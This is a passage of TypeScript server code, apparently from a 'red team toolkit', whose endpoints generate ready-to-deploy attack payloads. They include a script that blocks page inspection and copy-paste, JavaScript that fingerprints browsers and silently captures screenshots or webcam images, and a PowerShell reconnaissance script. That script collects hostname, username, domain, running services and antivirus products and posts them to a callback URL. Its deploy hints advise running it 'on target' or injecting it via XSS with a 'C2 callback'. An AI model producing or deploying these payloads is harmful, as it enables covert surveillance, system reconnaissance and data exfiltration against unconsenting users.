    if(${blockCopyPaste}){if(e.ctrlKey&&(e.key==='c'||e.key==='v'||e.key==='a'||e.key==='x')){e.preventDefault();e.stopPropagation();return false}}
    // F5 refresh
    if(e.key==='F5'){e.preventDefault();e.stopPropagation();return false}
  },true);
  // Context menu block
  if(${blockRightClick}){document.addEventListener('contextmenu',function(e){e.preventDefault();return false},true)}
  // Text selection block (disablectlaltdel.bas SelectAll equiv)
  document.addEventListener('selectstart',function(e){if(e.target.nodeName!=='INPUT'&&e.target.nodeName!=='TEXTAREA'){e.preventDefault();return false}},true);
  // Drag block (prevent dragging page elements to reveal source URLs)
  document.addEventListener('dragstart',function(e){e.preventDefault();return false},true);
  ${callbackUrl ? `// Report block attempts\n  document.addEventListener('keydown',function(e){if(_blocked.length>0){var d=JSON.stringify({t:'keyhijack',sid:'${sid}',blocked:_blocked,ts:Date.now()});fetch('${callbackUrl}?sid=${sid}&t=keyhijack',{method:'POST',body:d,mode:'no-cors'}).catch(function(){});_blocked=[]}},true);\n` : ""}
})();`;

  return res.json({ ok: true, module: "disablectlaltdel.bas", payload, language: "javascript",
    deployHint: "Prevents users/analysts from inspecting the page. Inject to test if CSP/DevTools policies enforce inspection controls." });
});

// POST /redteam-scan/toolkit/screen-monitor  (Monitor.bas)
// Generates a screen capture / webcam / canvas-fingerprint payload
router.post("/toolkit/screen-monitor", (req, res) => {
  const { callbackUrl, sid = "default", captureInterval = 30, mode = "canvas" } = req.body as {
    callbackUrl: string; sid?: string; captureInterval?: number; mode?: "canvas" | "screen" | "webcam";
  };
  if (!callbackUrl) return res.status(400).json({ error: "callbackUrl required" });

  const canvasPl = `/* Monitor.bas → Canvas Fingerprint | Twizted v1.0 technique */
(function(){
  var _cb='${callbackUrl}',_sid='${sid}';
  // Canvas rendering fingerprint (GPU/font anti-aliasing reveals device identity)
  var c=document.createElement('canvas');c.width=280;c.height=60;var ctx=c.getContext('2d');
  ctx.textBaseline='top';ctx.font='14px Arial';ctx.fillStyle='#f60';ctx.fillRect(125,1,62,20);
  ctx.fillStyle='#069';ctx.fillText('Twizted v1.0 Monitor',2,15);ctx.fillStyle='rgba(102,204,0,0.7)';ctx.fillText('Twizted v1.0 Monitor',4,17);
  var fp=c.toDataURL();
  // Screen metrics
  var info={t:'canvas_fp',sid:_sid,fp:fp,screen:screen.width+'x'+screen.height,avail:screen.availWidth+'x'+screen.availHeight,dpr:devicePixelRatio||1,cd:screen.colorDepth,ts:Date.now()};
  var d=JSON.stringify(info);
  try{navigator.sendBeacon(_cb+'?sid='+_sid+'&t=canvas_fp',d)}catch(ex){fetch(_cb+'?sid='+_sid+'&t=canvas_fp',{method:'POST',body:d,mode:'no-cors'}).catch(function(){})}
})();`;

  const screenPl = `/* Monitor.bas → Screen Capture | Twizted v1.0 technique */
/* Tests whether getDisplayMedia() is permitted — requires user approval gesture */
(function(){
  var _cb='${callbackUrl}',_sid='${sid}',_iv=${Math.max(10,Number(captureInterval))};
  function _snap(stream){
    var v=document.createElement('video');v.srcObject=stream;v.play().then(function(){
      setTimeout(function(){
        var c=document.createElement('canvas');c.width=v.videoWidth||1920;c.height=v.videoHeight||1080;
        c.getContext('2d').drawImage(v,0,0);
        c.toBlob(function(b){
          var fd=new FormData();fd.append('t','screenshot');fd.append('sid',_sid);fd.append('ts',Date.now().toString());fd.append('file',b,'screen.jpg');
          fetch(_cb+'?sid='+_sid+'&t=screenshot',{method:'POST',body:fd}).catch(function(){});
        },'image/jpeg',0.5);
      },500);
    }).catch(function(){});
  }
  navigator.mediaDevices.getDisplayMedia({video:{width:{ideal:1920},height:{ideal:1080}},audio:false})
    .then(function(stream){_snap(stream);setInterval(function(){_snap(stream)},_iv*1000)})
    .catch(function(e){var d=JSON.stringify({t:'screen_denied',sid:_sid,err:e.message,ts:Date.now()});navigator.sendBeacon(_cb+'?sid='+_sid+'&t=screen_denied',d)});
})();`;

  const webcamPl = `/* Monitor.bas → Webcam Capture | Twizted v1.0 technique */
(function(){
  var _cb='${callbackUrl}',_sid='${sid}';
  navigator.mediaDevices.getUserMedia({video:{width:{ideal:1280},height:{ideal:720}},audio:false})
    .then(function(stream){
      var v=document.createElement('video');v.srcObject=stream;v.play().then(function(){
        setTimeout(function(){
          var c=document.createElement('canvas');c.width=v.videoWidth;c.height=v.videoHeight;
          c.getContext('2d').drawImage(v,0,0);
          c.toBlob(function(b){
            var fd=new FormData();fd.append('t','webcam');fd.append('sid',_sid);fd.append('ts',Date.now().toString());fd.append('file',b,'cam.jpg');
            fetch(_cb+'?sid='+_sid+'&t=webcam',{method:'POST',body:fd}).catch(function(){});
          },'image/jpeg',0.6);
          stream.getTracks().forEach(function(t){t.stop()});
        },800);
      });
    }).catch(function(e){var d=JSON.stringify({t:'cam_denied',sid:_sid,err:e.message,ts:Date.now()});navigator.sendBeacon(_cb+'?sid='+_sid+'&t=cam_denied',d)});
})();`;

  const payload = mode === "screen" ? screenPl : mode === "webcam" ? webcamPl : canvasPl;
  return res.json({ ok: true, module: "Monitor.bas", payload, language: "javascript", mode,
    deployHint: mode === "canvas" ? "No user permission needed — silently captures GPU/font fingerprint." : mode === "screen" ? "Requires user to click 'Share Screen' — tests if users grant screen access to injected scripts." : "Requires getUserMedia permission — tests webcam access policy." });
});

// POST /redteam-scan/toolkit/win64-recon  (WinAPI x64 — Modern Windows Platform)
// Generates Win64-native recon payloads replacing all deprecated Win32 APIs.
// Win32 API mapping (all deprecated or unreliable on Win10/11 x64):
//   GetVersionEx         → RtlGetVersion / Get-CimInstance Win32_OperatingSystem
//   GetSystemInfo        → [RuntimeInformation]::OSArchitecture + Win32_Processor CIM
//   GlobalMemoryStatusEx → CIM Win32_OperatingSystem.TotalVisibleMemorySize
//   EnumServicesStatus   → Get-Service / NtQuerySystemInformation
//   Process32First/Next  → Get-Process / NtQuerySystemInformation class 5
//   VirtualAllocEx       → NtAllocateVirtualMemory (direct NTAPI syscall)
//   navigator.platform   → ALWAYS "Win32" (browser compat lie) — parse UA string instead
router.post("/toolkit/win64-recon", (req, res) => {
  const {
    callbackUrl, sid = "default",
    detectWow64 = true, enumRegistry = true, enumAV = true,
  } = req.body as { callbackUrl: string; sid?: string; detectWow64?: boolean; enumRegistry?: boolean; enumAV?: boolean };
  if (!callbackUrl) return res.status(400).json({ error: "callbackUrl required" });

  // PowerShell x64 native recon (requires PS 5.1+ — built-in on all Win10/11)
  const ps1Script = `# Win64 Platform Recon — ProxhqVPN Red Team Toolkit
# Replaces ALL deprecated Win32 APIs with modern Win64 equivalents.
# Requires: PowerShell 5.1+ (built-in on Windows 10/11). Run 64-bit PS only.
# For authorized self-testing on systems you own.

$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference    = 'SilentlyContinue'
$sid = '${sid}'
$cb  = '${callbackUrl}'
$info = [ordered]@{ t='win64_recon'; sid=$sid; ts=[int64](Get-Date -UFormat %s) }

# ── Architecture (replaces deprecated GetVersionEx + GetSystemInfo) ────────────
$info.arch           = [System.Runtime.InteropServices.RuntimeInformation]::OSArchitecture.ToString()
$info.proc_arch      = [System.Runtime.InteropServices.RuntimeInformation]::ProcessArchitecture.ToString()
$info.is64bit_os     = [Environment]::Is64BitOperatingSystem
$info.is64bit_proc   = [Environment]::Is64BitProcess
# NOTE: Win32 GetVersionEx was REMOVED in Windows 8.1. Use RtlGetVersion via CIM.
$os = Get-CimInstance Win32_OperatingSystem
$info.os_name        = $os.Caption
$info.os_version     = $os.Version
$info.os_build       = $os.BuildNumber          # e.g. 22621 = Win11 22H2
$info.os_arch        = $os.OSArchitecture       # "64-bit"
$info.hostname       = $env:COMPUTERNAME
$info.domain         = $env:USERDNSDOMAIN ?? $env:USERDOMAIN
$info.username       = $env:USERNAME

# ── CPU (replaces Win32 GetSystemInfo — use CIM Win32_Processor) ───────────────
$cpu = Get-CimInstance Win32_Processor | Select-Object -First 1
$info.cpu_name        = $cpu.Name.Trim()
$info.cpu_cores       = $cpu.NumberOfCores
$info.cpu_logical     = $cpu.NumberOfLogicalProcessors
$info.cpu_addr_width  = $cpu.AddressWidth       # 64 = x64 native

# ── RAM (replaces GlobalMemoryStatusEx — use CIM) ─────────────────────────────
$info.ram_total_gb    = [math]::Round($os.TotalVisibleMemorySize/1MB,1)
$info.ram_free_gb     = [math]::Round($os.FreePhysicalMemory/1MB,1)
$info.ram_pct_used    = [math]::Round((1-($os.FreePhysicalMemory/$os.TotalVisibleMemorySize))*100,0)

${detectWow64 ? `# ── WOW64 Detection (32-bit subsystem on 64-bit Windows) ────────────────────
# WOW64 = Windows on Windows 64. Routes 32-bit apps to SysWOW64 & Wow6432Node.
$info.syswow64_exists  = Test-Path 'C:\\Windows\\SysWOW64\\cmd.exe'
# x64 ntdll.dll is ~2MB; 32-bit (WOW64) ntdll is ~1.5MB — simple heuristic
$ntdll64 = Get-Item 'C:\\Windows\\System32\\ntdll.dll' -EA SilentlyContinue
$info.ntdll64_size_kb  = if($ntdll64){[math]::Round($ntdll64.Length/1KB,0)}else{0}
# 32-bit processes running under WOW64 (they load from SysWOW64)
$wow64_procs = Get-Process | Where-Object {
    try { $_.Modules | Where-Object { $_.FileName -like '*SysWOW64*' } } catch {}
} | Select-Object -First 10
$info.wow64_proc_count = @($wow64_procs).Count
$info.wow64_proc_names = ($wow64_procs.Name -join ',')
` : ""}
${enumRegistry ? `# ── Registry — Win64 uses separate 64/32-bit hives ──────────────────────────
# Wow6432Node = where 32-bit apps write HKLM\\SOFTWARE on 64-bit Windows
$info.reg_wow6432_count = (Get-ChildItem 'HKLM:\\SOFTWARE\\Wow6432Node' -EA SilentlyContinue).Count
# Check if running as 64-bit process sees full registry (not redirected)
$info.reg_is64_view = [Microsoft.Win32.RegistryKey]::OpenBaseKey(
    [Microsoft.Win32.RegistryHive]::LocalMachine,
    [Microsoft.Win32.RegistryView]::Registry64) -ne $null
` : ""}
# ── Network ───────────────────────────────────────────────────────────────────
$net = Get-NetAdapter -Physical -EA SilentlyContinue
$info.network = ($net | ForEach-Object { "$($_.Name):$($_.Status):$($_.LinkSpeed)" }) -join '|'

# ── Services (replaces Win32 EnumServicesStatus + CreateToolhelp32Snapshot) ───
$running_svcs = Get-Service | Where-Object { $_.Status -eq 'Running' }
$info.svc_count   = @($running_svcs).Count
$info.svc_sample  = (($running_svcs | Select-Object -First 15).Name -join ',')

${enumAV ? `# ── Security Products (Win64 uses WMI SecurityCenter2 namespace) ─────────────
# Win32 equivalent didn't exist — this is a modern Win64 WMI addition
$av  = Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct   -EA SilentlyContinue
$fw  = Get-CimInstance -Namespace root/SecurityCenter2 -ClassName FirewallProduct     -EA SilentlyContinue
$asc = Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiSpywareProduct  -EA SilentlyContinue
$info.av_products  = ($av  | ForEach-Object { $_.displayName }) -join ','
$info.fw_products  = ($fw  | ForEach-Object { $_.displayName }) -join ','
$info.asc_products = ($asc | ForEach-Object { $_.displayName }) -join ','
` : ""}
# ── Exfil via HTTP POST ────────────────────────────────────────────────────────
$json = $info | ConvertTo-Json -Compress -Depth 3
try {
    Invoke-RestMethod -Uri "$cb\`?sid=$sid&t=win64_recon" -Method POST \`
        -Body $json -ContentType 'application/json' -UseBasicParsing
} catch {
    # Fallback: sendBeacon-style fire and forget
    $r = [System.Net.HttpWebRequest]::Create("$cb\`?sid=$sid&t=win64_recon")
    $r.Method = 'POST'; $r.ContentType = 'application/json'
    $b = [System.Text.Encoding]::UTF8.GetBytes($json)
    $r.ContentLength = $b.Length
    $s = $r.GetRequestStream(); $s.Write($b,0,$b.Length); $s.Close()
    $r.GetResponse().Close()
}`;

  // Browser-side x64 detection (fixes the navigator.platform "Win32" lie)
  const jsBrowser = `/* Win64 Platform Recon — Browser-side x64 detection */
/* IMPORTANT: navigator.platform ALWAYS returns "Win32" on ALL Windows browsers */
/* including 64-bit Chrome, Edge, Firefox. This is a legacy compat decision.     */
/* To detect actual architecture, parse the User-Agent string instead.           */
(function(){
  var _cb='${callbackUrl}',_sid='${sid}';
  var ua=navigator.userAgent;
  // Real architecture detection from UA (what Win32 GetSystemInfo used to tell you)
  var arch='unknown';
  if(/Win64.*x64|x64.*Win64/i.test(ua))      arch='x64 (native 64-bit)';
  else if(/WOW64/i.test(ua))                  arch='x86 on WOW64 (32-bit browser on 64-bit OS)';
  else if(/ARM64/i.test(ua))                  arch='ARM64';
  else if(/Win32/i.test(ua)&&navigator.platform==='Win32') arch='x86 (or 64-bit OS — UA ambiguous)';
  // Windows version from UA (replaces deprecated GetVersionEx)
  var winVer='unknown';
  var m=ua.match(/Windows NT ([\\d.]+)/);
  if(m){var v=m[1];winVer=({'10.0':'Windows 10/11','6.3':'Windows 8.1','6.2':'Windows 8','6.1':'Windows 7'}[v])||'Windows NT '+v}
  var info={
    t:'win64_browser_recon',sid:_sid,
    platform_lie:navigator.platform,   // always "Win32" — legacy compat lie
    arch:arch,                          // actual arch from UA
    win_version:winVer,
    is_win10_plus:/Windows NT 10/.test(ua),
    is64bit_ua:/Win64.*x64|ARM64/i.test(ua),
    wow64:(/WOW64/i.test(ua)),
    cores:navigator.hardwareConcurrency||0,
    memory:(navigator.deviceMemory||0)+'GB',
    screen:screen.width+'x'+screen.height+'@'+screen.colorDepth+'bit',
    dpr:devicePixelRatio||1,
    ua:ua,
    ts:Date.now()
  };
  var d=JSON.stringify(info);
  try{navigator.sendBeacon(_cb+'?sid='+_sid+'&t=win64_recon',d)}
  catch(ex){fetch(_cb+'?sid='+_sid+'&t=win64_recon',{method:'POST',body:d,mode:'no-cors'}).catch(function(){})}
})();`;

  return res.json({
    ok: true,
    module: "WinAPI x64",
    payloads: { powershell: ps1Script, browser: jsBrowser },
    payload: ps1Script,
    language: "powershell",
    win32ToWin64Map: [
      "GetVersionEx (removed Win8.1+) → RtlGetVersion / Get-CimInstance Win32_OperatingSystem",
      "GetSystemInfo → [RuntimeInformation]::OSArchitecture + CIM Win32_Processor",
      "GlobalMemoryStatusEx → CIM Win32_OperatingSystem.TotalVisibleMemorySize",
      "EnumServicesStatus → Get-Service / NtQuerySystemInformation",
      "CreateToolhelp32Snapshot → Get-Process / NtQuerySystemInformation Class 5",
      "VirtualAllocEx → NtAllocateVirtualMemory (NTAPI direct syscall)",
      "navigator.platform (always 'Win32' lie) → Parse User-Agent for Win64/x64",
      "WOW64: SysWOW64 path + Wow6432Node registry hive + ntdll.dll size heuristic",
    ],
    note: "PowerShell requires 5.1+ (built-in on all Windows 10/11). Run as x64 PowerShell (not x86 ISE). WOW64 detection and registry enumeration require no elevated privileges.",
    deployHint: "PowerShell: copy to .ps1 and run on target. Browser: inject via XSS or <script> for browser-side x64 fingerprinting with automatic C2 callback.",
  });
});

export default router;
